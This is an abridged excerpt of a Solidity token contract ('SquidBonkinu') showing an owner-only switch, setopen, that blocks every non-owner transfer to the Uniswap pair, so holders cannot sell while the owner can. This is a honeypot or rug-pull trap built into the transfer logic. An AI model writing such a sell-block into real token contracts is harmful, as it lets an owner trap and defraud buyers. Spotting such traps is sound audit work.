...
contract heroInu is Context, IERC20, Ownable {
    ...
    address private _marketingWalletAddress = 0x423E394bFbc0437185c2342D5aF33e3c84996c5d;
    ...
    string private _name = "SquidBonkinu";
    ...
    event openUpdated(bool enabled);
    ...
    function setopen(bool _enabled) public onlyOwner {
        openEnabled = _enabled;
        emit openUpdated(_enabled);
    }
    ...
    function _transfer(
        ...
        if(from != owner() && to != owner()){
         ...
         if(to == uniswapV2Pair && from != owner()){
            require(openEnabled,'Transfer not possible');
        }
